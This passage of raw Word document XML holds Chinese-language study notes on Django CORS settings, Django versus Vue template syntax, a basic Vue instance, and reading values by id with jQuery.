        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>中间层设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B5100B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B5E1F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>‘corsheaders.middleware.CorsMiddleware’,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E2045E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68579FAD" w14:textId="4DA9A9C0" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798364C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>添加白名单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEAF507" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># CORS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150393A6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CORS_ORIGIN_WHITELIST = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9C74F5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>‘127.0.0.1:8080’,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B433D11" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>‘localhost:8080’,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442DC5B3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>‘www.meiduo.site:8080’,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B148A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>‘api.meiduo.site:8000’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06255257" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04959F1F" w14:textId="343C3E0D" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CORS_ALLOW_CREDENTIALS = True # 允许携带cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B06119E" w14:textId="52F11C0E" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="007D1FFE" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="756" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>0</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:ins w:id="757" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>、</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="758" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidDel="007D1FFE">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>模板与</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Vue</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>模板语法区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B37243" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>diango模板 (templates)用的不多</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F222028" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>像Vue里面的话 就是胡子语法 “Mustache”语法 (双大括号) 的文本插值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1ED7D8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多了空格的话在Django里会报错</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24267F98" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F36CCE1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>扩：django模板指在工程中创建模板目录templates。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B9BB78" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>胡子语法指的是{{data}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DEE4CB" w14:textId="045EBE5D" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>vue通过axios来连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFC061B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Vue实例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8302C9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>每个 Vue 应用都是通过实例化一个新的 Vue对象开始的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030ED614" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>window.onload = function(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3776E2" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>var vm = new Vue({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D8B018" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    el:'#app',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E85A2B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    data:{message:'hello world!'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D7E81C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F02E67" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">}    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E30C9AF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>......</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B6151F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;div id="app"&gt;{{ message }}&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486EE2E2" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其中，el属性对应一个标签，当vue对象创建后，这个标签内的区域就被vue对象接管，在这个区域内就可以使用vue对象中定义的属性和方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6102E2F3" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>vue.js没有集成ajax功能，要使用ajax功能，可以使用vue官方推荐的axios.js库来做ajax的交互。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C95EDE" w14:textId="058DF702" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00D46807" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="759" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>0</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>13</w:t>
      </w:r>
      <w:ins w:id="760" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>、</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="761" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidDel="00D46807">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">jequery </w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>里通过</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>怎么取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47646CE9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>先定位到节点，然后用val 就是val这个方法 如果是本身默认的话,就用val,如果是你自己那个的话， 就用attr这个方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588DE210" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用$("#id").val()获取value值</w:t>
      </w:r>
    </w:p>
